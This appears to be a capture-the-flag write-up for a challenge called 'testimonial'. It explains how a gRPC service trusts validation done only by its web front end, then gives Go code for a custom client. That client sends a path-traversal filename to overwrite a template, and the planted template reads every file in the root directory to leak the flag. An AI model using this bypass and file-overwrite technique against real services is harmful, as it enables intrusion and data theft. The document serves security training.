# testimonial

As the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction's hackers have set out to deface the official KORP website to send them a message that the revolution is closing in.

## Solution

```sh
docker run -d -p 1337:1337 -p 50045:50045 testimonial
```

https://youtu.be/EGItzKCxTdQ?si=Ju6odrgwEQsWz1We&t=568

go app, grpc

all validation is happening on web server, so you can actually make a grpc client to interact directly with the grpc server!

`.air.toml` is used to live reload service - https://github.com/cosmtrek/air (live reload for Go apps)

everytime a testimonial is submitted, the `index.templ` is going to read all templates from disk.

grpc client code was copied out and validation was removed, exploit template was created

```go
// exploit.templ
// this is just index.templ with overrided GetTestimonials function

//...

// override GetTestimonials() to read root directory

func GetTestimonials() []string {
	fsys := os.DirFS("/")
	files, err := fs.ReadDir(fsys, ".")
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, _ := fs.ReadFile(fsys, file.Name())
		res = append(res, string(fileContent))
	}
	return res
}
```

```go
// snippet of copied out grpc client

// ...

func main() {
	c, _ := GetClient()
	exploit, _ := ioutil.ReadFile("./exploit.templ")
	c.SendTestimonial("../../view/home/index.templ", string(exploit))
	// c.SendTestimonial("../../main.go", string(exploit))
}
```

bypasses web server and hits grpc handler directly to leak flag
